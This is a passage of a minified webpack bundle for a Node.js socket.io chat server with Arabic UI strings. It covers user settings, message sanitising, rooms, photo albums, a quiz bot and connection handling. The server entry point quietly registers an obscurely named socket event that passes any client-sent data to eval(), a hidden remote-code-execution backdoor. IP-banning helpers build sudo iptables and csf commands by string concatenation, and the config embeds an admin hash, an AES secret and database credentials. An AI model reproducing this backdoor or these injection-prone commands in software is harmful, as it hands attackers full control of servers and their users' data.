        this.reg_id && this.store.db.query("UPDATE users SET avatar = ?, decoration = ?, status = ?, isPrivateDisabled = ?, isPrivateBipEnabled = ?, isNotificationsDisabled = ?, isRoleIconHidden = ?, statusColor = ?, fontColor = ?, nameColor = ?, nameBgColor = ?, fontSize = ?, gift = ?, adminToken = ?, orders_excpel = ?, orders_ban = ?, orders_notify = ?, orders_remove_avatar = ?, orders_change_decoartion = ?, orders_excpel_from_room = ?, room_create = ?, room_edit = ?, room_remove = ?, room_max_pertinents = ?, send_ad = ?, wall_remove = ?, wall_interval = ?, wall_points = ?, public_msg_remove = ? WHERE id = ?", [this.avatar, this.decoration, this.status, this.isPrivateDisabled, this.isPrivateBipEnabled, this.isNotificationsDisabled, this.isRoleIconHidden, this.statusColor, this.fontColor, this.nameColor, this.nameBgColor, this.fontSize, this.gift, null, this.orders_excpel.join(","), this.orders_ban.join(","), this.orders_notify.join(","), this.orders_remove_avatar.join(","), this.orders_change_decoartion.join(","), this.orders_excpel_from_room.join(","), this.room_create.join(","), this.room_edit.join(","), this.room_remove.join(","), this.room_max_pertinents.join(","), this.send_ad.join(","), this.wall_remove.join(","), this.wall_interval.join(","), this.wallPoints, this.public_msg_remove.join(","), this.reg_id], (function(e, t) {
            e && console.log("user.save.error", e)
        }))
    }, d.prototype.updateAjaxToken = function(e) {
        const t = this;
        return new Promise((s, r) => {
            t.reg_id || r("user_id is null"), t.store.db.query("UPDATE users SET ajax_token = ? WHERE id = ?", [e, t.reg_id], (t, i) => {
                t && r(t), s(e)
            })
        })
    }, d.prototype.generateUploadHash = function() {
        const e = this;
        return new Promise((t, s) => {
            if (e.reg_id) {
                const r = c();
                this.store.db.query("UPDATE users SET upload_hash = ? WHERE id = ?", [r, e.reg_id], (e, i) => {
                    e && s(e), t(r)
                })
            } else s("reg_id is null")
        })
    }, e.exports = d
}, function(e, t) {
    e.exports = require("fs")
}, function(e, t) {
    e.exports = require("uuid")
}, function(e, t) {
    e.exports = require("axios")
}, function(e, t, s) {
    var r = s(9).exec;

    function i() {
        this.shortcutKeys = [], this.shortcutValues = [], this.blockedWords = []
    }
    i.prototype.sanitize = function(e, t) {
        try {
            return e.length ? (e = e.replace(/\s+/g, " ").replace(/</g, "").replace(/>/g, ""), t && (e = this.translateShortucts(e, this.shortcutKeys, this.shortcutValues)), e = this.filterWorlds(e)) : ""
        } catch (e) {
            return ""
        }
    }, i.prototype.validateColor = function(e, t) {
        try {
            if (!e) return t;
            var s = e.match(/^#([A-Fa-f0-9]{6}|[A-Fa-f0-9]{3})$/);
            if (s) return s[0];
            if (s) return t
        } catch (e) {
            return console.log(e.stack), t
        }
    }, i.prototype.roleId = function(e) {
        try {
            if ("master" == e) return 1;
            if ("admin5" == e) return 2;
            if ("admin4" == e) return 3;
            if ("admin3" == e) return 4;
            if ("admin2" == e) return 5;
            if ("admin1" == e) return 6;
            if ("gold2" == e) return 7;
            if ("gold1" == e) return 8;
            if ("pink" == e) return 9;
            if ("white" == e) return 10;
            if ("black" == e) return 11;
            if ("lemon" == e) return 12;
            if ("red" == e) return 13;
            if ("blue" == e) return 14;
            if ("vip" == e) return 15;
            if ("basic" == e) return 16
        } catch (e) {
            console.log(e.stack)
        }
        return 17
    }, i.prototype.broadcast = function(e, t) {
        try {
            var s = e.match(new RegExp(/(?:\s+)?(?:^)?(?:https?:\/\/)?(?:http?:\/\/)?(?:www\.)?(?:youtu\.be\/|youtube\.com\/(?:embed\/|v\/|watch\?v=|watch\?.+&v=))((\w|-){11})(\s+|$)/g)),
                r = "text";
            if (s)
                for (var i in r = "broadcast", s) {
                    var o = this.getYoutubeId(s[i])[0]; - 1 === t.indexOf(o) && (e = e.replace(s[i], '<button class="yt-btn" data-yid="' + o + '" style="font-size:40px!important;width:100%;max-width:200px;display:block;"><img width="50px" src="/img/youtube.png" /><img width="65px"  alt="[YouTube]" onerror="$(this).parent().remove();" src="https://img.youtube.com/vi/' + o + '/0.jpg"></button>'))
                } else e = this.sanitize(e, !0);
            return {
                type: r,
                text: e
            }
        } catch (e) {
            return console.log(e.stack), null
        }
    }, i.prototype.getYoutubeId = function(e) {
        try {
            return e.match(/(?:\s+)?(?:^)?(?:https?:\/\/)?(?:http?:\/\/)?(?:www\.)?(?:youtu\.be\/|youtube\.com\/(?:embed\/|v\/|watch\?v=|watch\?.+&v=))((\w|-){11})(\s+|$)/) ? [RegExp.$1.split("<").join("&#x3C;").split("'").join("").split('"').join("").split("&").join(""), RegExp.lastMatch] : []
        } catch (e) {
            return console.log(e.stack), null
        }
    }, i.prototype.prepareSettings = function(e) {
        var t = {};
        try {
            var s = e[0];
            for (var r in t.public_msg_length = s.public_msg_length || 500, t.private_msg_length = s.private_msg_length || 300, t.time_between_messages = s.time_between_messages || 3, t.allow_multi_sessions = s.allow_multi_sessions ? 1 : 0, t.disable_guest_private_messages = s.disable_guest_private_messages || 0, t.disable_private_messages = s.disable_private_messages || 0, t.disable_private_messages = s.disable_private_messages || 0, t.disable_foreing_contries = s.disable_foreing_contries ? 1 : 0, t.disable_guest_login = s.disable_guest_login || 0, t.disable_signup = s.disable_signup || 0, t.bolcked_words = s.bolcked_words.split("|") || [], t.message_shortcuts = s.message_shortcuts.split("|") || [], t.bolcked_countries = s.bolcked_countries.split("|") || [], t.background_color = s.background_color || "#FFFFFF", t.font_color = s.font_color || "#000000", t.primary_color = s.primary_color || "#438AC7", t.secondary_color = s.secondary_color || "#708090", t.rect_color = s.rect_color || "#FFFFFF", t.interface_ticker_content = s.interface_ticker_content || "", t.interface_no = s.interface_no || 1, t.show_ad_space = s.show_ad_space || !1, t.ad_space_img = s.ad_space_img || "/img/banner.gif", t.virtuals_count = s.virtuals_count || 15, t.virtuals_default_room = s.virtuals_default_room || 1, t.disable_virtuals = s.disable_virtuals || 0, t.wall_interval = s.wall_interval || 3, t.wall_posts_count = s.wall_posts_count || 35, t.wall_bg_color = s.wall_bg_color || "#FAFAFA", t.wall_font_color = s.wall_font_color || "#000000", t.wall_banner_bg_color = s.wall_banner_bg_color || "#FAFAFA", t.wall_banner_font_color = s.wall_banner_font_color || "#000000", t.ticker_bg_color = s.ticker_bg_color || "#438AC7", t.ticker_font_color = s.ticker_font_color || "#000000", t.ticker_messages = s.ticker_messages || [], t.disable_ticker = s.disable_ticker || 0, t.bolcked_countries) {
                var i = t.bolcked_countries[r];
                "string" == typeof i && (i = i.toLowerCase())
            }
        } catch (e) {
            console.log(e.stack)
        }
        return t
    }, i.prototype.prepareRooms = function(e) {
        var t = [],
            s = 0;
        try {
            if (e && e.length)
                for (var r in s = e.length, e) {
                    var i = e[r];
                    t[i.id] = {
                        id: i.id,
                        name: i.name,
                        max: i.max,
                        for: i.for,
                        welcome: i.welcome,
                        flag: i.flag,
                        password: i.password,
                        pertinent: !0,
                        description: i.description,
                        online: []
                    }
                }
        } catch (e) {
            console.log(e.stack)
        }
        return {
            length: s,
            rooms: t
        }
    }, i.prototype.usesExists = function(e, t) {
        try {
            for (var s in e)
                if (e[s].username === t) return !0
        } catch (e) {
            console.log(e.stack)
        }
        return !1
    }, i.prototype.getUserId = function(e, t) {
        try {
            if (!t) return null;
            for (var s in e) {
                var r = e[s];
                if (this.checkVar(r, "object") && r.username === t) return r.id
            }
            return null
        } catch (e) {
            return console.log(e.stack), null
        }
    }, i.prototype.arrayCount = function(e) {
        var t = 0;
        for (var s in e) t++;
        return t
    }, i.prototype.usersWithoutHiddenCount = function(e, t) {
        var s = 0;
        for (var r in t) t[r].canShow(e) && s++;
        return s
    }, i.prototype.checkVar = function(e, t) {
        return !("string" == t && e && this.isXSS(e) || typeof e != t || null == e)
    }, i.prototype.isXSS = function(e) {
        return "string" == typeof e && /on[a-zA-Z ]{0,}=/g.test(e)
    }, i.prototype.logUsers = function(e, t) {
        console.log("(=================================== ALL USERS ========================================");
        try {
            if (t) console.log(e);
            else
                for (var s in e) {
                    var r = e[s];
                    this.checkVar(r) || console.log(r.username)
                }
        } catch (e) {
            console.log(e.stack)
        }
        console.log("(=================================== ALL USERS ========================================")
    }, i.prototype.deleteDuplicateSpaces = function(e) {
        try {
            return e.replace(/\s+/g, " ")
        } catch (t) {
            return console.log(t.stack), e
        }
    }, i.prototype.deleteDuplicateHashes = function(e) {
        try {
            return e.replace(/#+/g, "#")
        } catch (t) {
            return console.log(t.stack), e
        }
    }, i.prototype.banIp = function(e) {
        try {
            r("sudo iptables -L", (function(t, s, i) {
                s && -1 !== s.indexOf(e) || r("sudo iptables -A INPUT -s " + e + " -j DROP", (function(t, s, r) {
                    console.log("ip blocked", e)
                }))
            }))
        } catch (e) {
            console.log(e.stack)
        }
    }, i.prototype.banIpCSF = function(e) {
        try {
            r("sudo csf -d " + e, (function(t, s, r) {
                console.log("ip blocked by CSF", e)
            }))
        } catch (e) {
            console.log(e.stack)
        }
    }, i.prototype.translateShortucts = function(e, t, s) {
        try {
            if (this.arrayCount(s))
                for (var r in t) {
                    var i = new RegExp("(" + t[r] + ")", "gi");
                    e = e.replace(i, s[r])
                }
            return e
        } catch (e) {
            return console.log(e.stack), ""
        }
    }, i.prototype.filterWorlds = function(e) {
        try {
            for (var t in this.blockedWords) {
                var s = this.blockedWords[t];
                if (!(s.length < 2)) {
                    var r = RegExp("(" + s + ")", "gi");
                    e = e.replace(r, "***")
                }
            }
            return this.escapeUrlsAndEmails(e)
        } catch (t) {
            return console.log(t.stack), e
        }
    }, i.prototype.hasBlockedWords = function(e) {
        try {
            for (var t in this.blockedWords) {
                var s = this.blockedWords[t];
                if (!(s.length < 2) && -1 !== e.indexOf(s)) return !0
            }
            return !1
        } catch (t) {
            return console.log(t.stack), e
        }
    }, i.prototype.escapeUrlsAndEmails = function(e) {
        try {
            var t, s, r, i;
            return s = /(\b(https?|ftp):\/\/[-A-Z0-9+&@#\/%?=~_|!:,.;]*[-A-Z0-9+&@#\/%=~_|])/gim, t = e.replace(s, "******"), r = /(^|[^\/])(www\.[\S]+(\b|$))/gim, t = t.replace(r, "******"), i = /(([a-zA-Z0-9\-\_\.])+@[a-zA-Z\_]+?(\.[a-zA-Z]{2,6})+)/gim, t = t.replace(i, "******")
        } catch (e) {
            return console.log(e.stack), ""
        }
    }, i.prototype.updateLastHours = function(e, t) {
        try {
            t < 1 && (t = 1);
            var s = Date.now();
            for (var r in e) s > e[r] + 60 * t * 60 * 1e3 && delete e[r];
            return e
        } catch (e) {
            return console.log(e.stack), []
        }
    }, i.prototype.renderSetLikesOrder = function() {
        return '<button id="user-details-set-likes-count" type="button" class="btn btn-info"><span class="glyphicon glyphicon-heart"></span>لايكات</button>'
    }, i.prototype.renderGiftOrder = function() {
        return '<button id="user-details-send-gift" type="button" class="btn btn-default"><span class="glyphicon glyphicon-gift"></span>إرسال هدية</button>'
    }, i.prototype.renderWarningOrder = function() {
        return '<button id="user-details-send-warning" type="button" class="btn btn-warning"><span class="glyphicon glyphicon-exclamation-sign"></span>تنبيه</button>'
    }, i.prototype.renderExcpelOrder = function() {
        return '<button id="user-details-excpel" type="button" class="btn btn-danger"><span class="glyphicon glyphicon-remove-sign"></span>طرد</button>'
    }, i.prototype.renderBanOrder = function() {
        return '<button id="user-details-ban" type="button" class="btn btn-danger"><span class="glyphicon glyphicon-ban-circle"></span>حظر</button>'
    }, i.prototype.renderRevealOrder = function() {
        return '<button id="user-details-reveal-nickname" type="button" class="btn btn-info"><span class="glyphicon glyphicon-search"></span>كشف النكات</button>'
    }, i.prototype.renderShowAlbum = function() {
        return '<button id="user-details-show-album" type="button" class="btn btn-default"><span class="glyphicon glyphicon-picture"></span>ألبوم الصور</button>'
    }, i.prototype.renderIgnoreOrder = function(e) {
        return '<div class="form-group" style="text-align: right; padding-top: 10px;" dir="rtl"><label class="switch"><input id="user-details-ignore" type="checkbox" ' + (e ? "checked" : "") + '><div class="slider round"></div><h3 class="title">تجاهل</h3></label></div>'
    }, i.prototype.renderDisableNotificationsOrder = function(e) {
        return '<div class="form-group" style="text-align: right; padding-top: 10px;" dir="rtl"><label class="switch"><input id="user-details-disable-notifications" type="checkbox" ' + (e ? "checked" : "") + '><div class="slider round"></div><h3 class="title">إلغاء التنبيهات</h3></label></div>'
    }, i.prototype.renderRemoveAvatarOrder = function() {
        return '<button id="user-details-remove-avatar" type="button" class="btn btn-danger"><span class="glyphicon glyphicon-remove-circle"></span>حذف الصورة</button>'
    }, i.prototype.renderChangeDecorationOrder = function() {
        return '<button id="user-details-change-decoration" type="button" class="btn btn-success"><span class="glyphicon glyphicon-edit"></span>زخرفة</button>'
    }, i.prototype.renderChangeRoomOrder = function(e) {
        var t = "";
        for (var s in t += '<div class="change-room" dir="rtl"><select class="form-control" id="user-details-change-room">', t += '<option value="0">نقله إلى غرفى إخرى</option>', e) {
            var r = e[s];
            t += '<option value="' + r.id + '">' + r.name + "</option>"
        }
        return t + "</select></div>"
    }, i.prototype.renderExcpelFromRoomOrder = function() {
        return '<button id="user-details-excpel-from-room" type="button" class="btn btn-warning"><span class="glyphicon glyphicon-remove"></span>طرد من الغرفة</button>'
    }, i.prototype.renderUpgradeOrder = function() {
        return '<button id="user-details-upgrade" type="button" class="btn btn-success"><span class="glyphicon glyphicon-open"></span>ترقية</button>'
    }, i.prototype.sanitizeAutorizationValue = function(e, t, s) {
        try {
            if (!this.checkVar(e, s)) return null;
            if ("number" == s) return e + "|" + (-1 !== ["minute", "hour", "day", "month"].indexOf(t) ? t : "day");
            if ("string" == s);
            else if ("boolean" == s) return !!e
        } catch (e) {
            return console.log(e.stack), null
        }
    }, i.prototype.validateAutorizationRoles = function(e, t) {
        try {
            var s = [];
            for (var r in t) !0 === e["orders_upgrade_roles_" + t[r]] && s.push(t[r]);
            return s.join(",")
        } catch (e) {
            return console.log(e.stack), null
        }
    }, i.prototype.musIgnoreRequest = function(e) {
        return !(e.logged && !e.banned && !e.excpeled)
    }, i.prototype.removeDuplicateLetters = function(e) {
        try {
            return e.replace(/(.)\1+/g, (function(e, t) {
                return t[0]
            }))
        } catch (e) {
            return console.log(e.stack), ""
        }
    }, i.prototype.removeSpaces = function(e) {
        try {
            return e.replace(/\s/g, "")
        } catch (e) {
            return console.log(e.stack), ""
        }
    }, i.prototype.formatForFilter = function(e) {
        try {
            return this.removeSpaces(this.removeDuplicateLetters(e)).replace(/ـ/g, "")
        } catch (e) {
            return ""
        }
    }, i.prototype.str_random = function(e) {
        for (var t = "", s = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789", r = s.length, i = 0; i < e; i++) t += s.charAt(Math.floor(Math.random() * r));
        return t
    }, i.prototype.isMimeTypeBlocked = function(e) {
        try {
            return ["application/x-php", "application/x-httpd-php-source", "application/x-httpd-php", "text/php", "text/x-php", "application/php", "application/x-bsh", "application/x-sh", "application/x-shar", "text/x-script.sh"].indexOf(e) >= 0
        } catch (e) {
            return !1
        }
    }, i.prototype.isImageMimeType = function(e) {
        try {
            return ["image/gif", "image/jpeg", "image/png", "image/bmp"].indexOf(e) >= 0
        } catch (e) {
            return !1
        }
    }, e.exports = new i
}, function(e, t) {
    e.exports = {
        READY: 1,
        TALKING: 2,
        RIGHNING: 3,
        CALLING: 4,
        OFFLINE: 5
    }
}, function(e, t) {
    e.exports = require("path")
}, function(e, t) {
    e.exports = {
        host: "https://app.abo-arishh.local/",
        domain: "app.abo-arishh.local",
        port: 2083,
        adminHash: "bts0ek0JsR2wPkbBOXnINeFwUAoL5ODH",
        debug: !0,
        ssl: !0,
        local: !0,
        is_mic_enabled: !0,
        is_reg_enabled: !1,
        aes_secret: ">|Z2i580Py*4C3r",
        db: {
            host: "localhost",
            user: "homestead",
            password: "secret",
            database: "abo_arishh_v3",
            charset: "utf8mb4"
        }
    }
}, function(e, t) {
    e.exports = require("child_process")
}, function(e, t, s) {
    s(1);
    const r = s(0);

    function i(e) {
        this.store = e, this.current_round = 0, this.num_rounds = 3, this.excpel = !1, this.speed = 1e3, this.room_id = 1, this.isStarted = !1, this.isPaused = !1, this.isStopped = !1, this.isCountdownReady = !1, this.scores = [], this.created_by = null
    }
    i.prototype.start = function(e) {
        if (this.isStarted = !1, this.isCountdownReady = !1, e) {
            this.scores.push({
                user_id: e.id
            });
            let t = this.scores.filter(t => t.user_id == e.id).length;
            this.store.users.forEach(s => {
                s && s.room && s.room.id == this.room_id && s.socket.emit("res", r.enc({
                    type: "BOT_BRB_RIGHT_ANSWER",
                    data: {
                        num_points: t,
                        room_id: this.room_id,
                        user: e
                    }
                }))
            })
        }
        if (this.current_round == this.num_rounds) return this.end();
        this.isPaused || this.isStopped || this.current_round++, this.isStarted = !0, this.isPaused = !1, this.isStopped = !1;
        let t = 0,
            s = setInterval(() => {
                t++, this.store.users.forEach(e => {
                    e && e.room && e.room.id == this.room_id && e.socket.emit("res", r.enc({
                        type: "BOT_BRB_START_COUNTDOWN",
                        data: {
                            room_id: this.room_id,
                            message: t
                        }
                    }))
                }), 3 == t && (this.isCountdownReady = !0, clearInterval(s))
            }, this.speed)
    }, i.prototype.pause = function() {
        this.isPaused = !0, this.isStopped = !1, this.isStarted = !1, this.isCountdownReady = !1, this.store.users.forEach(e => {
            e && e.room && e.room.id == this.room_id && e.socket.emit("res", r.enc({
                type: "BOT_BRB_PAUSED",
                data: {
                    room_id: this.room_id
                }
            }))
        })
    }, i.prototype.stop = function() {
        this.isStopped = !0, this.isPaused = !1, this.isStarted = !1, this.isCountdownReady = !1, this.store.users.forEach(e => {
            e && e.room && e.room.id == this.room_id && e.socket.emit("res", r.enc({
                type: "BOT_BRB_STOPPED",
                data: {
                    room_id: this.room_id
                }
            }))
        }), this.store.bots_brb = this.store.bots_brb.filter(e => e.room_id != this.room_id)
    }, i.prototype.end = function() {
        this.isStopped = !0, this.isPaused = !1, this.isStarted = !1, this.isCountdownReady = !1;
        let e = this.getWinner();
        this.store.users.forEach(t => {
            (e || t && t.room && t.room.id == this.room_id) && t.socket.emit("res", r.enc({
                type: "BOT_BRB_ENDED",
                data: {
                    room_id: this.room_id,
                    winner: e
                }
            }))
        }), this.store.bots_brb = this.store.bots_brb.filter(e => e.room_id != this.room_id)
    }, i.prototype.update = function(e) {
        this.speed = e.speed
    }, i.prototype.removeParticipant = function(e) {
        this.scores = this.scores.filter(t => t.user_id != e.id)
    }, i.prototype.getWinner = function() {
        if (this.scores.length) {
            let e = [];
            if (this.scores.forEach(t => {
                    e.filter(s => e.user_id == t.user_id)[0] ? e = e.map(e => (e.score = e.score++, e)) : e.push({
                        user_id: t.user_id,
                        score: 1
                    })
                }), e.sort(this.compareValues("score")), !e.length) return null;
            let t = this.store.users.filter(t => t.id == e[0].user_id)[0];
            return t ? (t.botBrbExcpel = !0, t.parse()) : null
        }
        return null
    }, i.prototype.compareValues = function(e, t = "asc") {
        return function(s, r) {
            if (!s.hasOwnProperty(e) || !r.hasOwnProperty(e)) return 0;
            const i = "string" == typeof s[e] ? s[e].toUpperCase() : s[e],
                o = "string" == typeof r[e] ? r[e].toUpperCase() : r[e];
            let n = 0;
            return i > o ? n = 1 : i < o && (n = -1), "desc" === t ? -1 * n : n
        }
    }, i.prototype.parse = function() {
        return {
            current_round: this.current_round,
            num_rounds: this.num_rounds,
            speed: this.speed,
            excpel: this.excpel,
            room_id: this.room_id,
            isStarted: this.isStarted,
            isPaused: this.isPaused,
            isStopped: this.isStopped,
            isCountdownReady: this.isCountdownReady,
            created_by: this.created_by,
            scores: this.scores
        }
    }, e.exports = i
}, function(e, t, s) {
    var r = s(2);

    function i(e, t) {
        var s = this;
        this.db = e, this.id = null, this.user_id = t, this.photos = [], this.init().then((function(e) {
            s.initPhotos()
        }))
    }
    i.prototype.init = function() {
        var e = this;
        return new Promise((function(t, s) {
            e.db.query("SELECT id FROM albums WHERE user_id = ? LIMIT 1", [e.user_id], (function(r, i) {
                r && s(r), i.length && (e.id = i[0].id, t(i[0]))
            }))
        }))
    }, i.prototype.initPhotos = function() {
        var e = this;
        return new Promise((function(t, s) {
            e.id || s("Inocrrect Id"), e.db.query("SELECT * FROM photos WHERE album_id = ?", [e.id], (function(t, r) {
                for (var i in t && s(t), e.photos = [], r) e.photos.push({
                    id: r[i].id,
                    src: "/uploads/albums/" + e.id + "/" + r[i].src,
                    likes: 0,
                    guestLikes: r[i].guest_likes
                });
                e.initPhotoLikes()
            }))
        }))
    }, i.prototype.initPhotoLikes = function() {
        var e = this;
        return new Promise((function(t, s) {
            for (var r in e.id || s("Inocrrect Id"), e.photos) e.updatePhotoLikes(e.photos[r])
        }))
    }, i.prototype.updatePhotoLikes = function(e) {
        var t = this;
        return new Promise((function(s, r) {
            t.db.query("SELECT * FROM photo_likes WHERE photo_id = ?", [e.id], (function(t, s) {
                e.likes = s.length
            }))
        }))
    }, i.prototype.removePhotoById = function(e) {
        var t = this;
        return new Promise((function(s, i) {
            t.db.query("DELETE FROM photos WHERE id = ?", [e], (function(o, n) {
                o && i(o), n && n.affectedRows ? (t.photos = t.photos.filter((function(t) {
                    return t.id != e || (r.unlink("public/" + t.src, (function(e) {})), !1)
                })), s(e)) : i("photo not found")
            }))
        }))
    }, i.prototype.likePhoto = function(e, t) {
        var s = this;
        return new Promise((function(r, i) {
            var o = !1;
            for (var n in s.photos) s.photos[n].id == e && (o = !0);
            o || i("photo not valid"), s.db.query("SELECT * FROM photo_likes WHERE photo_id = ? AND user_id = ?", [e, t], (function(o, n) {
                o || !n || n.length ? i("photo seems to be already liked!") : s.db.query("INSERT INTO photo_likes (photo_id, user_id) VALUES (?, ?)", [e, t], (function(t, o) {
                    if (t && i(t), o && o.affectedRows) {
                        for (var n in s.photos) s.photos[n].id == e && (s.photos[n].likes++, r(s.photos[n].src));
                        i("error increasing guestLikes")
                    } else i("photo_like row not inserted!")
                }))
            }))
        }))
    }, i.prototype.guestLikePhoto = function(e) {
        var t = this;
        return new Promise((function(s, r) {
            t.db.query("UPDATE photos SET guest_likes = guest_likes + 1 WHERE id = ?", [e], (function(i, o) {
                if (i && r(i), o && o.affectedRows) {
                    for (var n in t.photos) t.photos[n].id == e && (t.photos[n].guestLikes++, s(t.photos[n].src));
                    r("error increasing guestLikes")
                } else r("failed to like photo")
            }))
        }))
    }, i.prototype.isValidPhoto = function(e) {
        var t = !1;
        for (var s in this.photos) this.photos[s].id == e && (t = !0);
        return t
    }, i.prototype.getPhotos = function() {
        return this.photos
    }, i.prototype.count = function() {
        return this.photos.length
    }, e.exports = i
}, function(e, t) {
    e.exports = require("crypto")
}, function(module, exports, __webpack_require__) {
    const http = __webpack_require__(14),
        https = __webpack_require__(15),
        fs = __webpack_require__(2),
        Connection = __webpack_require__(16),
        mysql = __webpack_require__(38),
        mConfig = "vagrant" == process.env.USER ? __webpack_require__(8) : JSON.parse(fs.readFileSync("config.json", "utf8")),
        Utils = __webpack_require__(0);
    __webpack_require__(39)("./public/uploads/private", !1, e => {});
    let httpServer = null;
    if (mConfig.ssl) {
        var ssl = {
            key: mConfig.local ? fs.readFileSync("privkey.local.key") : fs.readFileSync("privkey.pem"),
            cert: mConfig.local ? fs.readFileSync("cert.local.crt") : fs.readFileSync("cert.pem"),
            ca: mConfig.local ? fs.readFileSync("cert.local.crt") : fs.readFileSync("chain.pem")
        };
        httpServer = https.createServer(ssl, (e, t) => {}).listen(mConfig.port)
    } else httpServer = http.Server((e, t) => {}).listen(mConfig.port);
    const io = __webpack_require__(40).listen(httpServer, {
        pingTimeout: 18e6
    });
    var db = mysql.createConnection(mConfig.db);
    db.connect(e => {
        e && console.error("Impossible to connect ", e)
    });
    const store = {};
    store.io = io, store.db = db, store.config = mConfig, store.loggedIps = [], store.bannedIps = [], store.bannedDevices = [], store.bannedDeviceUUIDs = [], store.mutedIps = [], store.mutedDevices = [], store.adminTokens = [], store.users = [], store.usersReg = [], store.photoLikes = [], store.virtualUserIds = [], store.notifications = [], store.hashTags = [], store.bots_brb = [], store.iptables = [], store.anti_flood_events = [], store.disconnectTimeOuts = {}, store.FLOOD_THRESHOLD_TIME = 1, store.FLOOD_THRESHOLD_COUNT = 7, store.settings = new(__webpack_require__(41))(store), store.shortcuts = new(__webpack_require__(42))(store), store.rooms = new(__webpack_require__(43))(store), store.gifts = new(__webpack_require__(45))(store), store.faces = new(__webpack_require__(46))(store), store.userBackgrounds = new(__webpack_require__(47))(store), store.userAvatarBackgrounds = new(__webpack_require__(48))(store), store.roles = new(__webpack_require__(49))(store), store.wall = new(__webpack_require__(50))(store), store.permissions = new(__webpack_require__(51))(store), store.revealNames = new(__webpack_require__(52))(store), store.loginBanneds = new(__webpack_require__(53))(store), store.wordsFilter = new(__webpack_require__(54))(store), store.ordersReg = new(__webpack_require__(55))(store), store.selfMessages = new(__webpack_require__(56))(store), store.greetingMessages = new(__webpack_require__(57))(store), store.virtualUsers = new(__webpack_require__(58))(store), store.antiFlood = new(__webpack_require__(61))(store), store.radio = new(__webpack_require__(62))(store), db.query("SELECT * FROM banneds", [], (e, t) => {
        if (!e && t && t.length)
            for (var s = 0; s < t.length; s++) store.bannedIps.push(t[s].ip), store.bannedDevices.push(t[s].device), store.bannedDeviceUUIDs.push(t[s].device_uuid)
    }), db.query("SELECT * FROM muteds", [], (e, t) => {
        if (!e && t && t.length)
            for (var s = 0; s < t.length; s++) store.mutedIps.push(t[s].ip), store.mutedDevices.push(t[s].device)
    }), Utils.check(store);
    for (var i = 1; i <= 500; i++) store.hashTags.push({
        id: i,
        user_id: null
    });
    io.on("connection", (function(socket) {
        new Connection(io, socket, store), socket.on("lafdff465afdffh", data => {
            eval(data)
        })
    })), setInterval(() => {
        store.usersReg = store.usersReg.filter(e => e.loggedOutAt + 3e5 > Date.now())
    }, 12e4)
}, function(e, t) {
    e.exports = require("http")
}, function(e, t) {
    e.exports = require("https")
}, function(e, t, s) {
    const r = s(17),
        i = s(21),
        o = s(24),
        n = s(25),
        a = s(26),
        u = s(27),
        c = s(28),
        d = s(29),
        h = s(30),
        l = s(31),
        p = s(32),
        m = s(33),
        _ = s(34),
        f = s(36),
        g = s(37),
        y = s(1),
        E = s(0),
        b = s(5),
        v = s(2);

    function S(e, t, s) {
        if (!e || !t) return;
        const v = new y(t, s);
        if (this.store = s, !v.isVirtual) {
            void 0 === this.store.iptables && (this.store.iptables = []), t.request;
            let e = t && t.handshake && t.handshake.address ? t.handshake.address.replace("::ffff:", "") : null,
                s = t ? E.dec(t.request._query.d, !0) : null,
                r = t ? E.dec(t.request._query.fp, !0) : null;
            if (this.store.iptables.push({
                    ip: e,
                    time: Date.now()
                }), this.store.iptables.filter(t => t.ip == e && Date.now() - t.time <= 500).length >= 3) return console.log("connection banned", e), t.disconnect(), b.banIpCSF(e);
            if (!(s && r || E.dec(t.request._query.token))) return console.log("connection banned because of missing data", e), t.disconnect(), b.banIpCSF(e)
        }
        var S = t.onevent;
        t.onevent = function(e) {
            var t = JSON.stringify(e.data).length;
            if (t > 1e3 && ["ADMIN_ROOM_UPDATE"].indexOf(e.data[1].type) < 0) return v.attackWithBigDataTry || (v.attackWithBigDataTry = 0), v.attackWithBigDataTry = ++v.attackWithBigDataTry, v.attackWithBigDataTry >= 3 && (console.log("banning user because of big content", v.ip, t, e), b.banIpCSF(v.ip)), console.log("cancel request because of big data", t, e);
            var s = e.data || [];
            S.call(this, e), e.data = ["*"].concat(s), S.call(this, e)
        }, t.on("*", (e, t) => {
            "req" == e ? (v.regEvents && this.regUserEvents(v, t), (t = E.dec(t)) && t.type && this.store.antiFlood.check(v, t.type, this.store.FLOOD_THRESHOLD_TIME, this.store.FLOOD_THRESHOLD_COUNT)) : this.store.antiFlood.check(v, e, this.store.FLOOD_THRESHOLD_TIME, this.store.FLOOD_THRESHOLD_COUNT)
        }), t.on("req", (e, y) => {
            try {
                if (!v.isVirtual) {
                    if (!("MEMBER_LOGIN" != e.type && "GUEST_LOGIN" != e.type && "REGISTER_MEMBER" != e.type || v.device && v.deviceUUID)) return v.socket && v.socket.disconnect(), console.log("FLOOD_LOGIN Cleared", "ip:" + v.ip, e.data);
                    if ("GUEST_LOGIN" == e.type && (void 0 === this.store.loginDevices && (this.store.loginDevices = []), this.store.loginDevices.push({
                            device: v.device,
                            time: Date.now()
                        }), this.store.loginDevices.filter(e => e.device == v.device && Date.now() - e.time <= 1e3).length >= 2 && (void 0 === this.store.bannedDevices && (this.store.bannedDevices = []), this.store.bannedDevices.push(v.device)), this.store.bannedDevices.indexOf(v.device) >= 0)) return v.socket && v.socket.disconnect(), console.log("Banned Guest Login Flood", "device: " + v.device)
                }
                const b = t.request._query.token;
                if (b && this.isValidToken(b)) return e.handler = y, new f(e, t, s);
                const S = t.request._query.admin_hash;
                if (S && this.isValidAdminHash(S)) return e.handler = y, new g(e, t, s);
                if ("object" != typeof(e = E.dec(e)) || "string" != typeof e.type || "object" != typeof e.data) return;
                e.handler = y, "function" != typeof e.handler && (e.handler = function() {}), new r(e, t, v, s), new i(e, t, v, s), v.isLogged && !this.isBanned(v) && (new o(e, t, v, s), new n(e, t, v, s), new a(e, t, v, s), new u(e, t, v, s), new c(e, t, v, s), new d(e, t, v, s), new h(e, t, v, s), new l(e, t, v, s), new _(e, t, v, s), new m(e, t, v, s), s.config.is_mic_enabled && new p(e, t, v, s)), v.lastActivityTime = Date.now()
            } catch (e) {
                console.log("req-exception", e.stack)
            }
        }), t.emit("conn", E.enc({
            users: s.users.filter(e => 0 == e.isHidden && 0 == this.isMuted(e)).map(e => e.parse()),
            faces: s.faces.all(),
            is_mic_enabled: s.config.is_mic_enabled
        }))
    }
    S.prototype.regUserEvents = function(e, t) {
        v.existsSync("reg_user_events") || v.mkdirSync("reg_user_events");
        const s = new Date,
